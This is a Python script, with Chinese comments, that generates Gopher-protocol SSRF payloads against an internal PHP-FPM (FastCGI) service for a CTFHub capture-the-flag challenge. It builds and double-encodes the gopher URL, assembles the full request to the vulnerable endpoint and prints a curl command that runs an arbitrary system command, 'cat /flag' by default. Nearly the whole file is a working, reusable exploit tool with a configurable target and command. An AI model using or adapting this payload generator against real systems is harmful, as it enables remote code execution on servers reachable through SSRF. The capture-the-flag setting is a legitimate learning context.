#!/usr/bin/env python3
"""
CTFHub FastCGI SSRF Payload 生成器
通过 Gopher 协议攻击内网 PHP-FPM (FastCGI) 实现 RCE

用法:
  python3 /tmp/generate_fastcgi_payload.py
  python3 /tmp/generate_fastcgi_payload.py -H 127.0.0.1 -P 9000 -F /var/www/html/index.php -C "cat /flag"
"""

import sys
import argparse

sys.path.insert(0, '/home/san/Applications/Gopherus3')
from gopherus3.module.FastCGI import FastCGI
from gopherus3.piper import LineN


class MockArgs:
    def __init__(self, **kwargs):
        for k, v in kwargs.items():
            setattr(self, k, v)
        # FastCGI 模块需要的默认值 (不能空, 否则会触发交互式输入)
        self.targetfile = kwargs.get("targetfile", "/var/www/html/index.php")
        self.command = kwargs.get("command", "cat /flag")
        self.help = False


class MockParser:
    def add_argument(self, *a, **k): pass
    def parse_args(self): return MockArgs()
    def print_help(self): pass


def generate_payload(host="127.0.0.1", port=9000, targetfile="/var/www/html/index.php", command="cat /flag"):
    """
    生成 FastCGI 攻击 Payload

    参数:
        host:       PHP-FPM 主机地址 (默认 127.0.0.1)
        port:       PHP-FPM 端口 (默认 9000)
        targetfile: 服务器上真实存在的 PHP 文件路径 (默认 /var/www/html/index.php)
        command:    要执行的系统命令 (默认 cat /flag)

    返回:
        (原始payload, 二次编码payload, 执行URL)
    """
    options = {
        "host": host,
        "port": port,
    }

    f = FastCGI(MockParser(), options)
    f.targetfile = targetfile
    f.command = command

    # 生成原始 gopher URL
    raw_payload = f.generate()

    # FastCGI 协议需要用 LF (\n) 而不是 CRLF (\r\n)
    # LineN 把 %0D%0A 替换成 %0A
    processed = LineN().pipe(raw_payload)

    # 二次编码, 用于通过 HTTP GET 参数传递 (?url=)
    double_encoded = processed.replace('%', '%25')

    return processed, double_encoded


def main():
    parser = argparse.ArgumentParser(
        description="FastCGI SSRF Payload 生成器",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  %(prog)s -H 127.0.0.1 -P 9000 -F /var/www/html/index.php -C "cat /flag"
  %(prog)s -C "ls -la / | base64"          # 换命令
        """
    )

    parser.add_argument("-H", "--host", default="127.0.0.1", help="PHP-FPM 主机 (默认: %(default)s)")
    parser.add_argument("-P", "--port", type=int, default=9000, help="PHP-FPM 端口 (默认: %(default)d)")
    parser.add_argument("-F", "--file", default="/var/www/html/index.php",
                        help="服务器上存在的 PHP 文件路径 (默认: %(default)s)")
    parser.add_argument("-C", "--command", default="cat /flag", help="执行的系统命令 (默认: %(default)s)")
    parser.add_argument("-u", "--target-url", default="http://challenge-xxxx.sandbox.ctfhub.com:10800",
                        help="目标 SSRF 入口 URL (默认: %(default)s)")

    args = parser.parse_args()

    raw, double = generate_payload(args.host, args.port, args.file, args.command)

    # 构造完整请求 URL
    separator = "&" if "?" in args.target_url else "?"
    full_url = f"{args.target_url}{separator}url={double}"

    print("=" * 70)
    print("  CTFHub FastCGI SSRF Payload 生成器")
    print("=" * 70)
    print(f"\n[配置]")
    print(f"  目标:      {args.host}:{args.port}")
    print(f"  PHP文件:   {args.file}")
    print(f"  命令:      {args.command}")
    print(f"\n[1] 原始 Gopher URL (用于直接 curl):")
    print(f"    {raw}")
    print(f"\n[2] 二次编码 URL (?url= 参数用):")
    print(f"    {double}")
    print(f"\n[3] 完整 HTTP 请求 URL:")
    print(f"    {full_url}")
    print(f"\n[4] 或直接用 curl:")
    print(f"    curl -s \"{full_url}\" > /tmp/result.bin && strings /tmp/result.bin | grep -E 'ctfhub|flag'")
    print("\n" + "=" * 70)
    print("提示: 响应含二进制字符, 建议重定向到文件后用 strings 提取")
    print("      或在 Burp 里用 Raw 视图查看")
    print("=" * 70)


if __name__ == "__main__":
    main()
